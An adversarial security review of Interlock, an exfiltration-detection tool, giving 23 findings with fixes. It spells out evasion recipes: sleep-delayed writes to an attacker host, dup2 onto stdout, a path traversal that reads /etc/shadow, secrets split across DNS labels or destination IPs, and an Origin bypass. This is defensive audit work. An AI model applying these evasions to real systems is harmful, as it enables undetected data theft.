# Security review — external, adversarial

**Date:** 2026-08-28 · **Scope:** full tree at `docs/readme-rewrite` (118181d) · **Reviewer perspective:** senior security engineer, adversarial read

Method: README and [`threat_model.md`](threat_model.md) read first, then the code — engine, overlap/decode/chunk/container, proxy dispatch/framer/spawn, HTTP transport, bridge, k8s attribution, and [`internal/ebpf/bpf/connect.c`](../internal/ebpf/bpf/connect.c) line by line. `go build ./...` and core package tests green (`internal/ebpf` and `internal/bridge` do not build/run on darwin — expected).

This document is deliberately **not** merged into [`threat_model.md`](threat_model.md). That file is the project's own self-assessment; this one is an outside read of the same system, and the delta between them is the point. Findings here that survive triage should graduate into T1–T6 or into `KnownGap` pins.

---

## Verdict

The design thesis is right and genuinely differentiated. "Don't classify intent, prove byte movement at the sink" is the correct reduction of the trifecta problem, and the verdict/action split — soft signals structurally incapable of blocking — is the single best decision in the codebase. [`threat_model.md`](threat_model.md) is better than what most funded security vendors ship; T1–T6 are honest and the `KnownGap` test discipline is real engineering, not marketing.

And: **Variant A is a solid product; Variant B is a demo that has been dressed as a control plane.** The proxy plane does what it says. The kernel plane has at least five independent one-line evasions that any attacker who reads `connect.c` — which the README explicitly invites them to do — will find in twenty minutes. None of them are in the gap ledger. Worse, the demo passes because the demo's exfil server ([`servers/exfil/main.go:83`](../servers/exfil/main.go)) happens to use Go's `conn.Write`, which is the exact one of four egress paths that works.

Findings below are ordered by the order they should be fixed.

---

## Tier 1 — the kernel plane is evadable by construction

### 1. `send(2)` is a total blind spot

[`connect.c:373`](../internal/ebpf/bpf/connect.c):

```c
if (!buf || count == 0 || !sa)
    return 0;
```

glibc's `send(fd, buf, len, flags)` compiles to the `sendto` syscall with `arg4 = NULL`. So every `send()` and `sendall()` returns early and produces **no event at all** — no payload, no destination, nothing. Python's `socket.send`/`sendall` go straight through this. Given how much of the MCP server ecosystem is Python, this isn't an edge case; it's the default egress path for a large fraction of the monitored population.

The fix is already written twenty lines below — `sendmsg` at [`connect.c:456`](../internal/ebpf/bpf/connect.c) falls back to the `write_event` layout when `msg_name` is absent. `sendto` should do the same instead of returning.

### 2. `if (fd < 3) return 0;`

[`connect.c:277`](../internal/ebpf/bpf/connect.c), `:320`, `:367`, `:420`. `dup2(sock, 1); write(1, secret, n);` and the payload probe never fires. Two syscalls. This presumably exists to suppress stdio noise — filter on `S_ISSOCK` of the fd, or on correlation state, not on the numeric fd.

### 3. `writev`/`sendmsg` capture only `iov[0]`

[`connect.c:328`](../internal/ebpf/bpf/connect.c) and `:438`, both commented "verifier-safe". `iov[0] = "POST /x HTTP/1.1\r\n\r\n"`, `iov[1] = secret` — the secret bytes never reach userspace, so egress reassembly can't save you either. Yet [`threat_model.md`](threat_model.md) T6 lists `sendmsg`/`writev` under **"No longer bypass channels — closed"**. They're probed, not closed. A bounded unrolled loop over the first 4–8 iovecs is verifier-tractable.

### 4. The 5-second connect→write window discards everything else

[`internal/ebpf/sensor.go:520`](../internal/ebpf/sensor.go): a `write` event is dropped entirely unless a non-allowlisted `connect` from the same PID landed within `SuspiciousConnectTTL` = 5s ([`sensor.go:20`](../internal/ebpf/sensor.go)).

```
connect(attacker); sleep(6); write(fd, secret);
```

Zero payload inspection. The write event is thrown away before overlap ever runs. This is the cheapest bypass in the repo and it isn't in the gap ledger. The correlation state should be keyed by the socket fd and live as long as the fd does — `fd` is already carried in `write_event`; it just isn't used. A wall-clock TTL is the wrong primitive for a connection lifetime.

### 5. TOCTOU on every `bpf_probe_read_user`

All probes are `sys_enter` tracepoints reading userspace memory *before* the kernel copies it. A second thread flips the buffer between the tracepoint and `copy_from_user`, and the probe records benign bytes while the kernel sends the secret. Same for the `sockaddr` in `connect` — swap it after the tracepoint and the recorded destination is a lie, which means **the egress allowlist decision in `handleConnect` ([`sensor.go`](../internal/ebpf/sensor.go)) is made on attacker-chosen data.** Report `127.0.0.1`, the sensor ignores the connect entirely, and then finding 4 means the writes are dropped too. Full Variant B bypass, no exotic technique required.

This one is genuinely hard to close completely, and is reasonable to accept as a documented boundary — but two cheap improvements: take the destination from the `lsm/socket_connect` hook, which receives the *kernel-copied* `sockaddr` (already attached at [`connect.c:509`](../internal/ebpf/bpf/connect.c)); and move payload capture to `sys_exit` so the return value — how many bytes actually went — is known, instead of trusting the pre-call `count`.

### 6. The payload buffer is never zeroed

[`connect.c:294`](../internal/ebpf/bpf/connect.c):

```c
__builtin_memset(ev, 0, offsetof(struct write_event, payload));   // stops before payload
...
bpf_probe_read_user(ev->payload, PAYLOAD_MAX, buf);               // return value ignored
```

`bpf_probe_read_user` reads a fixed 1024 bytes and its return is unchecked. If it faults — trivially forced by placing the buffer at the tail of a page with the next page unmapped — the payload region keeps **whatever was previously in that ring-buffer slot**. Userspace then slices `raw[56 : 56+len]` at [`internal/ebpf/loader.go:644`](../internal/ebpf/loader.go) and hands it to overlap.

Two consequences, both bad: an attacker can blank their own payload on demand (evasion), and stale bytes from a *different process's* prior event can surface as this event's `payload_excerpt` — which lands in evidence and can produce a cross-process false `EXFIL` at 0.95 confidence with a `SIGKILL` attached. Memset the whole struct, or memset `payload[0..cap]` and check the return.

---

## Tier 2 — the privilege model

### 7. Spawned MCP servers inherit the proxy's privileges

[`internal/proxy/spawn.go:42`](../internal/proxy/spawn.go) sets `SysProcAttr{Setpgid: true}` and optionally `CLONE_NEWNET`. That is the entire isolation story. No `Credential{Uid,Gid}`, no `NoNewPrivs`, no seccomp, no user namespace — nothing anywhere in the tree.

[`threat_model.md`](threat_model.md) puts MCP servers **outside the TCB**. But `./interlock -ebpf` needs root, and `sudo make demo-ebpf` runs the three demo servers as root. So the untrusted component runs with the full privileges of the thing monitoring it. A malicious server doesn't evade Interlock; it edits the BPF maps, unloads the probes, rewrites `evidence.jsonl`, or connects to the taint bridge socket directly.

And `sandbox.netns` doesn't contain that child: with `CAP_SYS_ADMIN` in the initial user namespace, `setns(open("/proc/1/ns/net"), CLONE_NEWNET)` walks straight back out. T6 claims proxy-mode uncontrolled TCP egress is "closed when `sandbox.netns: true`". Against an unprivileged child, yes. Against the adversary the threat model actually posits, no.

The fix is not subtle: drop to a dedicated uid per server, add `NoNewPrivs`, and pair netns with a user namespace so the child's `CAP_SYS_ADMIN` is namespace-local. This is roughly 30 lines in `spawn.go` and it converts `sandbox.netns` from a claim into a control.

### 8. `ReadContainerFile` is an arbitrary node-file-read primitive

[`internal/k8s/proc_root.go:14`](../internal/k8s/proc_root.go), driven from [`cmd/interlock/main.go:137`](../cmd/interlock/main.go):

```go
rootPath := fmt.Sprintf("/proc/%d/root%s", pid, path)
```

`path` comes verbatim from the eBPF `openat` event — i.e. from attacker-controlled userspace memory in a monitored pod. No `filepath.Clean`, no `..` rejection, no `O_NOFOLLOW`. The only gate is `IsSensitiveResourcePath` ([`internal/engine/path_taint.go:29`](../internal/engine/path_taint.go)), which is a raw `strings.HasPrefix` against configured prefixes.

A monitored pod calls `open("/var/run/secrets/../../../../../etc/shadow")`. Prefix matches. The privileged, `hostPID` DaemonSet then resolves that through the `/proc/<pid>/root` magic link — and `..` past the container root walks up into the **host** mount namespace. Plus a `readFileLimited(path)` fallback at [`proc_root.go:32`](../internal/k8s/proc_root.go) that reads the path directly in the sensor's own namespace whenever the container read fails, which the attacker controls by choosing a path that doesn't exist in their own rootfs.

Then it gets worse. That content flows to `TaintPathDrivenContent` ([`path_taint.go:106`](../internal/engine/path_taint.go)), which registers **the entire 64 KB blob** as one tainted value, and `MaskValue` puts its first 3 and last 4 bytes into evidence `preview` — which ships to the webhook and SIEM. That's a 7-byte-per-call read oracle out of an air-gapped log pipeline, from inside a container, against arbitrary host files.

Minimum fix: `filepath.Clean` and reject any `..`, resolve with `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` against the container root fd, and re-validate the *cleaned* path against `sensitive_paths` rather than the raw one.

### 9. Unbounded taint and unbounded sessions, behind one global mutex

`state.Tainted` has no cap — `appendUniqueTainted` dedupes but distinct content always grows the slice. `SessionStore` ([`internal/engine/session_store.go`](../internal/engine/session_store.go)) has `Get`, `GetOrCreate`, `Upsert`, `All` and **no delete at all**; the proxy's `SessionManager.Cleanup` tears down runtimes but the engine state lives forever. Every HTTP `initialize`, every pod UID the sensor has ever seen, every `pod_uid` a bridge peer cares to name — permanent.

Chain that with finding 8: a pod loops `open("/x/credentials")` on a 64 KB file. Each iteration registers a 64 KB tainted value, computes gzip + brotli + zstd + lz4 of it ([`internal/engine/encoding.go:41`](../internal/engine/encoding.go)), and produces ~2,000 32-byte chunks. Every subsequent egress event then scans every payload against every chunk of every value — all under `Engine.mu`, which every plane shares. Memory grows, the engine stalls, the ring buffers back up, and events drop. **Detection degrades to zero via a path that never looks like an attack.** T3 covers "resource exhaustion" in the abstract; it does not cover this.

Cap `state.Tainted` (LRU by `RegisteredAt`), evict sessions, and index the chunk set instead of doing linear `strings.Contains` — an Aho-Corasick automaton over all variants and chunks is one dependency and turns O(values × chunks) into O(payload).

### 10. Whole-file taint × 32-byte chunk matching = EXFIL false positives that kill processes

Following from 8: `ContiguousChunks` ([`internal/engine/chunk.go:36`](../internal/engine/chunk.go)) slices any value ≥64 bytes into 32-byte runs, and a chunk hit returns `EXFIL` at 0.95 with `contained_by_kill`. `chunkableBody` strips PEM armor but nothing else. Register a 64 KB config file as taint and you have registered "32 consecutive spaces", `"\n\n\n\n..."`, or a common XML/JSON header fragment as **proof of exfiltration**.

The README's headline number is "EXFIL-tier false positive **0%**". That holds for the corpus, which is token-shaped secrets. It does not hold for the path-taint code path, and path-taint is the one wired to `SIGKILL`. `ShannonEntropy` is sitting right there in [`internal/engine/entropy.go`](../internal/engine/entropy.go), explicitly marked "never wired to classifyTrip". This is exactly where it should be wired: refuse to mint a chunk whose entropy is below ~3 bits/byte.

---

## Tier 3 — concrete bugs

### 11. Origin validation is bypassable two ways

[`internal/proxy/http/headers.go:71`](../internal/proxy/http/headers.go) uses `strings.Contains(origin, h)`, and [`transport.go:83`](../internal/proxy/http/transport.go) derives the host as `strings.Split(listen, ":")[0]`. Verified by running it:

```
BYPASS 1: listen=":8080" -> host="" -> evil Origin ACCEPTED
BYPASS 2: Origin=https://localhost.evil.example.com ACCEPTED
```

`listen: ":8080"` is idiomatic Go and silently disables the check entirely, because `strings.Contains(anything, "")` is true. Parse the Origin with `url.Parse` and compare `u.Host` exactly.

### 12. A malicious server can wedge a session's reader goroutine forever

[`internal/proxy/dispatch.go:276`](../internal/proxy/dispatch.go):

```go
select {
case ch <- frame:
    return
}
```

A single-case `select` is a blocking send. `ch` has capacity 1. Send two responses with the same JSON-RPC id after the 30s timeout fired but before the deferred map delete: the first fills the buffer, the second blocks forever, and `readServerFrames` — which calls this synchronously — never processes another frame from that server. Add `default:` and fall through to the agent writer.

### 13. Evidence and event logs are mode 0644

[`evidence_sink.go:36`](../internal/engine/evidence_sink.go), [`evidence_factory.go:61`](../internal/engine/evidence_factory.go), [`proxy/logger.go:41`](../internal/proxy/logger.go). Where-it-fails #6 says "treat evidence files as sensitive artifacts" — then makes them world-readable. `0600`.

### 14. The bridge accepts a 1-byte taint value and never checks the hash

`parseRegisterLine` in [`internal/bridge/bridge.go`](../internal/bridge/bridge.go) requires only non-empty `Value` and `Hash`. An allowlisted peer registers `value: "e"` and every payload containing the letter `e` becomes `EXFIL` → `SIGKILL` for the whole watched fleet. T2 correctly notes an allowed peer can forge `pod_uid`; it frames the ceiling as "alert volume, not fabricated proof." With no minimum length that ceiling is wrong — it's mass process termination. Enforce a minimum length and verify `Hash == sha256(Value)` so evidence can't carry a forged hash.

### 15. `RedactJSON` does string surgery on JSON

[`internal/engine/taint.go:95`](../internal/engine/taint.go) does `strings.ReplaceAll` over the raw blob and returns it as `json.RawMessage`. A secret spanning a `\"` escape, or a preview containing a quote or backslash, emits malformed JSON into `evidence.jsonl` — which then breaks `scanJSONLChainTip` on the next restart ([`evidence_sink.go:78`](../internal/engine/evidence_sink.go) returns an error and the sink fails to open). Unmarshal, walk the leaves, remarshal.

---

## Tier 4 — where the README outruns the code

Worth tightening regardless of whether anything above gets fixed; the docs are otherwise unusually honest and these erode that.

- **"Overlap alone is `EXFIL`. legs not consulted."** True — but overlap is only *computed* when the tool is already tagged `external_sink` ([`engine.go:342`](../internal/engine/engine.go) returns `Allow: true` before any scan). Tagging isn't a refinement on top of proof; it's the gate in front of it. The "mis-tagged tool is a blind spot" note is buried in Configuration; it belongs in "What counts as proof."

- **Three of the thirteen shapes are effectively demo-only.** gzip and zlib survive in general because `detectContainerKind` ([`container.go:76`](../internal/engine/container.go)) decompresses them. `brotli_base64`, `zstd_base64`, `lz4_base64` are **precomputed byte-exact strings** from Go's encoders at default settings — compression is not substring-preserving, so they match only if the attacker compresses exactly the secret, alone, with the same library at the same level. Python's zstd bindings produce different bytes and miss. Either add brotli/zstd/lz4 to the container walker or stop counting them as coverage.

- **"Hash-chained … tells you whether anything was altered or removed."** The chain is unkeyed SHA-256 over fully-public inputs, so anyone with write access recomputes it. `VerifyChain` ([`evidence_chain.go:56`](../internal/engine/evidence_chain.go)) also explicitly permits a first record with `ChainSeq > 0`, so head truncation verifies clean by design. T5 states both limits correctly; the README doesn't. Fix the README, or HMAC the chain with a key the workload can't read.

- **HTTP transport gap #7** frames the risk as process-table exhaustion. The actual risk is that `transport.listen` is an **unauthenticated remote tool-execution endpoint** — anyone who can reach the port can `tools/call read_ticket` and get the secrets back in the HTTP response, with no sink ever invoked and therefore no check performed. "Put ACLs in front of it" is the right advice attached to the wrong severity.

---

## If I had a week

1. `sendto` NULL-`sa` fallback, drop `fd < 3`, unroll iovecs, fd-keyed correlation instead of the 5s TTL, memset the full payload. That's ~40 lines of C and it closes four evasions that currently make Variant B a demo.
2. Privilege-drop spawned children (uid + `NoNewPrivs` + userns), and `openat2(RESOLVE_BENEATH)` in `ReadContainerFile`.
3. Cap `Tainted`, evict sessions, entropy-gate chunk minting.
4. Origin parsing, the `select` `default:`, `0600`, bridge value floor.
5. Add `KnownGap` pins for the TOCTOU and for any evasion not closed. The gap-pin discipline is the best thing in this repo — an undocumented bypass costs far more credibility than a documented one.

---

## Findings index

| # | Finding | Area | Where |
|---|---|---|---|
| 1 | `send(2)` produces no event | eBPF | [`connect.c:373`](../internal/ebpf/bpf/connect.c) |
| 2 | `fd < 3` skip — `dup2` evasion | eBPF | [`connect.c:277`](../internal/ebpf/bpf/connect.c) |
| 3 | Only `iov[0]` captured | eBPF | [`connect.c:328`](../internal/ebpf/bpf/connect.c), `:438` |
| 4 | 5s connect→write window drops payloads | sensor | [`sensor.go:520`](../internal/ebpf/sensor.go) |
| 5 | TOCTOU on `bpf_probe_read_user` | eBPF | all `sys_enter` probes |
| 6 | Payload region not zeroed; read unchecked | eBPF | [`connect.c:294`](../internal/ebpf/bpf/connect.c) |
| 7 | Children inherit proxy privileges; netns escapable | proxy | [`spawn.go:42`](../internal/proxy/spawn.go) |
| 8 | Arbitrary node file read via `/proc/<pid>/root` | k8s | [`proc_root.go:14`](../internal/k8s/proc_root.go) |
| 9 | Unbounded taint + sessions under one mutex | engine | [`session_store.go`](../internal/engine/session_store.go) |
| 10 | Low-entropy chunks → false EXFIL → SIGKILL | engine | [`chunk.go:36`](../internal/engine/chunk.go) |
| 11 | Origin validation bypass (×2) | http | [`headers.go:71`](../internal/proxy/http/headers.go) |
| 12 | Blocking single-case `select` wedges reader | proxy | [`dispatch.go:276`](../internal/proxy/dispatch.go) |
| 13 | Evidence/event logs world-readable | engine | [`evidence_sink.go:36`](../internal/engine/evidence_sink.go) |
| 14 | Bridge: no min length, hash unverified | bridge | [`bridge.go`](../internal/bridge/bridge.go) |
| 15 | `RedactJSON` can emit malformed JSON | engine | [`taint.go:95`](../internal/engine/taint.go) |

---

# Round 2 — deeper adversarial pass

**Date:** 2026-08-29. A second read hunting for vectors the first pass missed, concentrating on the correlation/reassembly logic, the decoder budget, the result-ingest path, and containment blast radius. Findings 16–23 below are **verified with runnable probes** against the `internal/engine` package (the probes were removed after confirming; each finding names what it proved). Round 1 (findings 1–15) stands unchanged.

Headline: the reassembly and decode layers — the parts the README sells as depth — each have a single-config or single-syscall escape, and the whole-file path-taint from finding 8/10 now has a **confirmed** false-`EXFIL`-to-`SIGKILL` trigger on an input as ordinary as a comment divider.

## 16. DNS reassembly discards every label but the first — verified

`normalizedEgressFragment` ([`engine.go:1176`](../internal/engine/engine.go)) reduces a DNS egress payload to the text before the first `.`:

```go
if i := strings.IndexByte(q, '.'); i > 0 {
    return q[:i]   // first label only
}
```

and `IngestSyscall` then scans overlap against **that**, not the raw excerpt — `payloadForOverlap = e.egressCandidatePayload(...)` replaces `ev.PayloadExcerpt` entirely ([`engine.go:714`](../internal/engine/engine.go)). So a secret anywhere but the leading label is never compared.

**Proved:** a `dns` event with `PayloadExcerpt = "junk." + secret + ".evil.example"` yields verdict `""` (no trip), while a direct `CheckOverlapPayload` of the identical string returns an `EXFIL` hit. The reassembly normalization *removes* detection a raw scan would have. Prepending one junk label is the whole bypass. (Real DNS wire-format is length-prefixed, not dotted, so this label parser is already operating on the wrong shape — but the security consequence is the miss.)

## 17. Egress reassembly is per-(pid, destination); split the secret across two IPs and it never joins — verified

`egressFlowKey` ([`engine.go:1286`](../internal/engine/engine.go)) is `fmt.Sprintf("%d|%s:%d", pid, destIP, destPort)`. Reassembly only concatenates fragments sharing that key, and the raw per-syscall excerpt is replaced by the reassembled window.

**Proved:** two `write` halves of one secret to the *same* dest → `EXFIL` (control passes, reassembly works). The same two halves to `203.0.113.1` and `203.0.113.2` → verdict `""`. Any attacker who round-robins destinations, or trickles slower than `egress_fragment_max_age` (10s, which resets `flow.Chunks`), defeats reassembly while each individual packet stays under the match threshold. Additionally `enforceEgressFlowCap` ([`engine.go:1261`](../internal/engine/engine.go)) evicts the oldest flow once 32 are active — so opening 32 decoy destination-flows *evicts the legitimate accumulating flow*, resetting its window to empty. None of these are in the gap ledger; only the single-syscall case is covered by the corpus.

## 18. The recursive decoder abandons any layer that decodes to >8 KiB — verified

`decodeMatchCandidates` ([`decode.go:74`](../internal/engine/decode.go)) opens with `if depth >= max || s == "" || len(s) > maxDecodeBytes { return nil }`, and `maxDecodeBytes = 8*1024`. The check is on the *input* to each layer, so if the **first** base64 decode produces more than 8 KiB, recursion stops before any match attempt.

**Proved:** `base64(secret + 12 KiB of filler)` sent as an egress payload → verdict `""`. The depth-5 decoder, fragments, chunk match — all bypassed by padding the secret with ≥8 KiB of filler inside a single encoding layer. This is cheaper than the "custom cipher / nests past the clamp" gaps the README does list; it needs no cipher and no extra nesting, just bulk.

## 19. A config-file divider line becomes a false `EXFIL` that SIGKILLs — verified (exploit of finding 10)

Round 1 argued this from the code; Round 2 fires it. Whole-file path-taint ([`path_taint.go:106`](../internal/engine/path_taint.go)) registers a read file as one tainted value; `AttachChunks` slices any body ≥64 bytes into 32-byte runs ([`chunk.go:36`](../internal/engine/chunk.go)); a chunk hit is `EXFIL` 0.95 with `contained_by_kill`. `TrimSpace` only removes *leading/trailing* whitespace, so **internal** low-entropy runs survive.

**Proved:** a "config file" of `app_config:\n` + `"#" × 80` + `\n key: value` registers a `################################` (32×`#`) chunk. An unrelated egress `"log: #####…(37×#)… done"` → verdict `EXFIL`, action `contained_by_kill`. Comment dividers (`#`, `-`, `=`, `*`), base64 zero-padding, repeated indentation, and ASCII banners are ubiquitous in exactly the credential/config files `sensitive_paths` is pointed at. The README's "EXFIL-tier false positive 0%" is a property of the token-shaped corpus, not of the path-taint code that is wired to kill. `ShannonEntropy` ([`entropy.go`](../internal/engine/entropy.go)) exists and is unused — gate chunk minting on it (≥~3 bits/byte) and this class disappears.

## 20. The result-ingest path is not panic-protected, unlike the request path

`dispatchToolsCall` wraps `EvaluateRequest` in `recover()` and notifies the fail-closed breaker on panic ([`dispatch.go:148`](../internal/proxy/dispatch.go)). The mirror path, `deliverServerFrame` → `IngestResult` ([`dispatch.go:264`](../internal/proxy/dispatch.go)), runs in the `readServerFrames` goroutine with **no recover** — confirmed: the only `recover()` in `proxy/` is on the request path.

`IngestResult` does strictly *more* untrusted-data processing than `EvaluateRequest`: taint extraction (six regexes), fragment-buffer re-scan, recursive decode, and bounded container descent — all on server-supplied result bytes. A panic anywhere in that chain crashes the process, and in HTTP mode that kills **every** session, not one. [`threat_model.md`](threat_model.md) T3 states "Sensor handler dispatch is `recover()`-wrapped so a panic no longer kills the DaemonSet" — true for the sensor and the request path, silent about the result path. The breaker's panic input is only wired where a panic is already caught. Wrap `IngestResult` the same way and route it to `onEnginePanic`.

## 21. Containment is a process-*group* kill; attribution is per-PID

`KillProcess` ([`sensor.go`](../internal/ebpf/sensor.go)) sends `SIGKILL` to `-pid` (the process group) as root in the `hostPID` DaemonSet with `CAP_KILL`:

```go
_ = syscall.Kill(-pid, syscall.SIGKILL)
_ = syscall.Kill(pid, syscall.SIGKILL)
```

Attribution decides *which* PID at per-PID granularity (cgroup→pod), but the kill lands on the whole group. Under the PID-reuse / cgroup-staleness races [`threat_model.md`](threat_model.md) T4 already accepts, a mis-attributed kill doesn't just target the wrong process — it takes out every sibling in that pgid. An attacker who arranges to share a pgid with a victim workload (or simply spawns the exfil in the pgid of a critical co-tenant) converts Interlock's containment into a root-privileged collateral-termination primitive against processes Interlock never suspected. The `-pid` group kill should be justified against the blast radius, or narrowed to the single attributed PID.

## 22. The egress allowlist does the opposite of intent on both shipped entries

The sensor matches allowlist by exact string against the numeric destination IP (`s.allowlist[destIP]`, [`sensor.go:isAllowlisted`](../internal/ebpf/sensor.go)). The shipped [`interlock.yaml`](../interlock.yaml) / [`interlock-http.yaml`](../interlock-http.yaml) `egress_allowlist` contains `127.0.0.1` and `api.anthropic.com`:

- **`api.anthropic.com`** is a hostname; the eBPF layer only ever sees an IP, so this entry **never matches** — the one destination the operator intended to trust is treated as suspicious on every connect.
- **`127.0.0.1`** *does* match, so a `connect(127.0.0.1)` is dropped before write-correlation arms ([`handleConnect`](../internal/ebpf/sensor.go)). A co-resident collector listening on loopback — the exact shape of the demo's own `exfil` "local" mode ([`servers/exfil/main.go:95`](../servers/exfil/main.go)) — is therefore an **unmonitored** Variant-B channel by shipped default.

So the allowlist silently under-trusts the legitimate host and over-trusts the loopback exfil path. At minimum: resolve hostnames to IP sets (and re-resolve), and do not ship `127.0.0.1` in a sample that also documents loopback exfil as a threat.

## 23. Minor: viewer renders one unescaped evidence field

[`web/viewer.html`](../web/viewer.html) escapes nearly everything through `esc()`, including attacker-influenced fields (`comm`, `path`, leg `detail`, `preview`). The exception is `item.ref` at the timeline render: `'<span class="tl-ref">#' + item.ref + '</span>'` is concatenated raw. `ref` is a `uint64` in legit records, so this only bites on a hand-crafted/tampered evidence file — but the viewer's entire purpose is opening files that may be post-incident and untrusted. One-line fix: `esc(String(item.ref))`.

## Round 2 index

| # | Finding | Verified | Where |
|---|---|---|---|
| 16 | DNS overlap sees only the first label | probe: 2nd-label secret → no trip | [`engine.go:1176`](../internal/engine/engine.go) |
| 17 | Reassembly per-(pid,dest); split/trickle/evict escapes | probe: same-dest EXFIL, cross-dest miss | [`engine.go:1286`](../internal/engine/engine.go) |
| 18 | Decoder abandons layers >8 KiB | probe: padded base64 → no trip | [`decode.go:74`](../internal/engine/decode.go) |
| 19 | Low-entropy chunk → false EXFIL → SIGKILL | probe: `#`-divider → contained_by_kill | [`chunk.go:36`](../internal/engine/chunk.go) |
| 20 | Result path not recover-wrapped | code: only request path has recover | [`dispatch.go:264`](../internal/proxy/dispatch.go) |
| 21 | Containment kills the process group | code: `Kill(-pid)` under CAP_KILL | [`sensor.go`](../internal/ebpf/sensor.go) |
| 22 | Allowlist under/over-trusts on shipped entries | code + config | [`sensor.go`](../internal/ebpf/sensor.go), [`interlock.yaml`](../interlock.yaml) |
| 23 | Viewer renders `item.ref` unescaped | code | [`web/viewer.html`](../web/viewer.html) |

## What Round 2 changes about the overall read

Round 1's thesis holds and sharpens: **the proxy plane (Variant A) is sound; every depth feature layered on top of it has a cheap escape, and the one feature wired to `SIGKILL` (path-taint chunking) has a confirmed false-positive trigger on ordinary input.** The reassembly, the depth-5 decoder, and the DNS handling are each defeated by a single knob an attacker controls — a junk label, a second IP, 8 KiB of filler. Individually minor; together they mean Variant B's "contained/detected" numbers describe an attacker who didn't read `engine.go`.

The priority order I'd now hold to:
1. **Entropy-gate chunk minting (finding 19).** It is the only confirmed path from benign input to a root `SIGKILL`. Ship this first; it is ten lines and `ShannonEntropy` already exists.
2. **Wrap `IngestResult` (finding 20)** — closes a fail-open-via-crash that the threat model implies is already closed.
3. **Then the kernel-plane evasions (Round 1, 1–6)** and the reassembly/decoder escapes (16–18), each with a `KnownGap` pin if not closed.
4. **Re-audit containment blast radius (21)** and the allowlist semantics (22) before any production claim about Variant B.
